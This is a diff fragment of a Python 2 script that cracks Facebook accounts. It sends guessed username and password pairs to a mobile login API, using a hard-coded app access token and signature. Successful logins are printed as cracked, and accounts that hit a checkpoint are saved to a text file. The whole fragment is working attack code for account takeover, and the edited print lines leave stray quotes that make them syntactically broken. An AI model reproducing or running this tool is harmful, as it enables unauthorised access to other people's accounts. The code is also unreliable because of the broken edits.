@@ -435,11 +435,11 @@ def startgrab():
 															                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															                q = json.load(data)
 															                if 'access_token' in q:
-																                 print '\x1b[1;92m[CRACKED] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass8 + '  ' + b['name']
+																                 print '\x1b[1;92m[CRACKED] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass8 '
 																                 oks.append(user+pass8)
 															                else:
 																                 if 'www.facebook.com' in q["error_msg"]:
-																	         print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass8 + '  ' + b['name']
+																	         print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass8 '
 																	         cek = open("out/CP.txt", "a")
 																	         cek.write(user+"|"+pass8+"\n")
 																	         cek.close()
@@ -449,11 +449,11 @@ def startgrab():
 															                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															                         q = json.load(data)
 															                         if 'access_token' in q:
-																                         print '\x1b[1;92m[CRACKED] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass9 + '  ' + b['name']
+																                         print '\x1b[1;92m[CRACKED] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass9 ' 
 																                         oks.append(user+pass9)
 															                         else:
 																                         if 'www.facebook.com' in q["error_msg"]:
-																	                 print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass9 + '  ' + b['name']
+																	                 print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass9 '
 																	                 cek = open("out/CP.txt", "a")
 																	                 cek.write(user+"|"+pass9+"\n")
 																	                 cek.close()
